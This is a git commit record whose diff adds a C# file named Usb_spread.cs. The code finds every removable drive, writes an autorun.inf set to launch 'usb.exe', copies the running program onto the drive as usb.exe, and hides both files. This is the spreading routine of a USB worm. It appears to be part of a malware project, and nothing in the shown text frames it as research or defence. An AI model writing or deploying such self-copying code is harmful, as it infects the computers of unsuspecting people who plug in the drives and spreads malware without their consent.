7f73e5d61d15d7d464d280ae911264cb184bac8d
clemibunge <clemibunge@gmail.com>
2018-10-22 20:46:23 +0200

    Update Usb_spread.cs

--- Usb_spread.cs
+++ Usb_spread.cs
@@ -1,1 +1,18 @@
+using System.IO;
 
+
+DriveInfo[] drives = DriveInfo.GetDrives();
+foreach (DriveInfo drive in drives)
+{
+	if (drive.DriveType == DriveType.Removable)
+	{
+		StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
+		writer.WriteLine("[autorun]\n");
+		writer.WriteLine("open=usb.exe");
+		writer.WriteLine("action=Run win32");
+		writer.Close();
+		File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
+		File.Copy(Application.ExecutablePath, drive.Name + "usb.exe", true);
+		File.SetAttributes(drive.Name + "usb.exe", File.GetAttributes(drive.Name + "usb.exe") | FileAttributes.Hidden);
+	}
+}
